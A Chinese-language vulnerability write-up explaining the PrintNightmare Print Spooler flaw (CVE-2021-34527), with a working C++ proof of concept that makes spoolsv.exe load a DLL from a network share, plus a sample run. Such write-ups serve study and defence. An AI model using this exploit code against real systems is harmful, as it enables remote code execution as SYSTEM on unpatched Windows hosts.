## 環境
* Windows Server 2019 (目標環境不能被更新過)
* Visual Studio 2019
* Impacket 0.9.23

## 漏洞介紹
今年微軟的 Print Spooler 漏洞頻頻，包含六月中的 CVE-2021-1675、七月的 CVE-2021-34527，還有八月的 CVE-2021-36936。這篇要說明這個被微軟稱作 PrintingNightmare 的 CVE-2021-34527 的成因與原理。

列印多工緩衝處理器 - Print Spooler，是用來管理所有本地和網絡打印隊列及控制所有打印工作。

原本這個漏洞只被認為是個 LPE(Local Privilege Escalation) 漏洞。但是只要在同個 Domain，並且在目標機器有一般使用者權限，能夠存取 Print Spooler 服務，就可以觸發這個漏洞。因此這個漏洞就升級成 RCE(Remote Code Execution) 漏洞。

## 確認服務
可以使用 [impacket](https://github.com/SecureAuthCorp/impacket) 的 rpcdump 確認 Print Spooler 服務是否存在。
```
$ python3 rpcdump.py @192.168.88.145 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-RPRN]: Print System Remote Protocol
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

## 漏洞成因與原理
### RPC
![](https://i.imgur.com/I0OxHY7.png)
從 Client 透過 RPC 傳送資訊給 Server 的 Print Spooler 服務，並且更新檔案。其中在處理 RPC 的過程，localspl.dll 中的 SplAddPrinterDriverEx 這個函數因為沒有檢查 SeLoadDriverPrivilege 權限，最終導致讓攻擊者可以提權至 SYSTEM 並執行任意程式。

### Upgrade
當 Print Spooler 有發生更新的狀況時，新版本的檔案會放在 `C:\Windows\System32\spool\drivers\x64\3`，而舊版本的檔案保留在 `C:\Windows\System32\spool\drivers\x64\3\Old\` 目錄，Old 裡面又會放流水號的目錄以免有很多個舊版本。攻擊者可以透過這點利用 RPC 先把網路芳鄰的檔案複製進本機目錄，再更新 Print Spooler 載入自己的 Image。

### 更新的檔案
三個參數 pDriverPath、pDataFile、pConfigFile 分別代表三個路徑，其中 pDriverPath 必須是 UNIDRV.dll，而 UNIDRV.dll 的位置會根據版本不同而改變，在我的 Windows Server 2019 的路徑是 `C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL`；pDataFile 可以使用 UNC Path，雖然不會載入到 spoolsv.exe，但是檔案會被複製；pConfigFile 則是會載入 spoolsv.exe 的檔案，不過這不能填 UNC Path，得要先利用 pDataFile 把檔案複製到本機後再 RPC 一次才載入。

## 漏洞重現
### 流程
1. 設定 RPC 參數
    * 其中 pDriverPath 必須是 UNIDRV.DLL;
    * pConfigFile 是會被載入的檔案;
    * pDataFile 不會被載入，但是會被複製到 C:\Windows\System32\spool\drivers\x64\3\ 
2. 取得經過身分驗證的 Binding Handle
3. 傳送 RPC，總共至少要傳 3 次
    * 第一次會先把 pDataFile 檔案複製到 C:\Windows\System32\spool\drivers\x64\3\ ，原本的檔案則被放到 C:\Windows\System32\spool\drivers\x64\3\Old\1 
    * 第二次會把第一次被複製到 C:\Windows\System32\spool\drivers\x64\3\ 的檔案放到 C:\Windows\System32\spool\drivers\x64\3\Old\2\ 
    * 第三次會把 pConfigFile 改成第二次被放到 C:\Windows\System32\spool\drivers\x64\3\Old\2 的檔案 
    
### POC
改自 [afwu/PrintNightmare](https://github.com/afwu/PrintNightmare)，不過現在連結似乎失效了，完整 POC 放在 [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E5%8F%88%E6%98%AFPrintSpooler%E6%90%9E%E7%9A%84%E9%AC%BC/PrintNightmare)。
```cpp=
int wmain(int argc, wchar_t* argv[]) {
    if (argc != 5) {
        printf(".\\poc.exe dc_ip path_to_exp user_name password\n");
        printf("For example: \n");
        printf(".\\poc.exe  192.168.228.191 \\\\192.168.228.1\\test\\MyExploit.dll test 123 \n");
        return 0;
    }
    wsprintf(dc_ip, L"%s", argv[1]);
    wsprintf(dc_path, L"\\\\%s", argv[1]);
    wsprintf(src_exp_path, L"%s", argv[2]);
    wsprintf(exp_name, L"%s", wcsrchr(argv[2], '\\')+1);
    wsprintf(username, L"%s", argv[3]);
    wsprintf(password, L"%s", argv[4]);

    printf("[+] Get Info:\n");
    wprintf(L"[+] dc_ip: %s\n", dc_ip);
    wprintf(L"[+] dc_path: %s\n", dc_path);
    wprintf(L"[+] src_exp_path: %s\n", src_exp_path);
    wprintf(L"[+] exp_name: %s\n", exp_name);
    wprintf(L"[+] username: %s\n", username);
    wprintf(L"[+] password: %s\n\n", password);

    // 1. 設定 RPC 參數
    // 其中 pDriverPath 必須是 UNIDRV.DLL;
    // pConfigFile 是會被載入的檔案;
    // pDataFile 不會被載入，但是會被複製到 C:\Windows\System32\spool\drivers\x64\3\ 
    DRIVER_INFO_2 info;
    info.cVersion = 3;
    info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\KernelBase.dll";
    info.pDataFile = src_exp_path;
    info.pDriverPath = (LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL";
    info.pEnvironment = (LPWSTR)L"Windows x64";
    info.pName = (LPWSTR)L"XDD";
    DRIVER_CONTAINER container_info;
    container_info.Level = 2;
    container_info.DriverInfo.Level2 = new DRIVER_INFO_2();
    container_info.DriverInfo.Level2->cVersion = 3;
    container_info.DriverInfo.Level2->pConfigFile = info.pConfigFile;
    container_info.DriverInfo.Level2->pDataFile = info.pDataFile;
    container_info.DriverInfo.Level2->pDriverPath = info.pDriverPath;
    container_info.DriverInfo.Level2->pEnvironment = info.pEnvironment;
    container_info.DriverInfo.Level2->pName = info.pName;

    // 2. 取得經過身分驗證的 Binding Handle
    RPC_BINDING_HANDLE handle;
    RPC_STATUS status = CreateBindingHandle(&handle);

    // 3. 傳送 RPC
    RpcTryExcept
    {
        DWORD hr;

        // 第一次會先把 pDataFile 檔案複製到 C:\Windows\System32\spool\drivers\x64\3\ ，原本的檔案則被放到 C:\Windows\System32\spool\drivers\x64\3\Old\1 
        // 第二次會把第一次被複製到 C:\Windows\System32\spool\drivers\x64\3\ 的檔案放到 C:\Windows\System32\spool\drivers\x64\3\Old\2\ 
        for (int i = 0; i < 2; i++) {
            hr = RpcAddPrinterDriverEx(handle,
                dc_path,
                &container_info,
                APD_COPY_ALL_FILES | 0x10 | 0x8000
            );
        }
		
        // 第三次會把 pConfigFile 改成第二次被放到 C:\Windows\System32\spool\drivers\x64\3\Old\2 的檔案 
        wsprintf(dest_exp_path, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Old\\2\\%s", exp_name);
        container_info.DriverInfo.Level2->pConfigFile = dest_exp_path;
        hr = RpcAddPrinterDriverEx(handle,
            dc_path,
            &container_info,
            APD_COPY_ALL_FILES | 0x10 | 0x8000
        );
        wprintf(L"[*] Try to load %s - ErrorCode %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
        if (hr == 0) return 0;
    }
    RpcExcept(1) {
        status = RpcExceptionCode();
        printf("RPC ERROR CODE %d\n", status);
    }
    RpcEndExcept
}
```

### 實際測試
```
# POC.exe 192.168.88.145 \\192.168.88.145\share\InjectedDLL.dll user password
[+] Get Info:
[+] dc_ip: 192.168.88.145
[+] dc_path: \\192.168.88.145
[+] src_exp_path: \\192.168.88.145\share\InjectedDLL.dll
[+] exp_name: InjectedDLL.dll
[+] username: user
[+] password: password

[+] Binding successful!! handle: -1519388184
[*] Try to load C:\Windows\System32\spool\drivers\x64\3\Old\2\InjectedDLL.dll - ErrorCode 0
```

POC 會試圖複製並載入 InjectedDLL.dll 檔案，ErrorCode 為 0 時代表成功。這時在目標機器用 Process Explorer 查看 spoolsv.exe 有沒有成功載入 InjectedDLL.dll。

## 修補狀況
CVE-2021-34527 已在今年七月修補，也包含與之相關的 CVE-2021-1675。

## 參考資料
* [曾感染臺灣的勒索軟體Magniber正在開採PrintNightmare漏洞](https://www.ithome.com.tw/news/146233)
* [cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
* [微軟8月Patch Tuesday修補3個零時差漏洞， 包含一新的Print Spooler漏洞](https://www.ithome.com.tw/news/146135)
* [afwu/PrintNightmare](https://github.com/afwu/PrintNightmare)
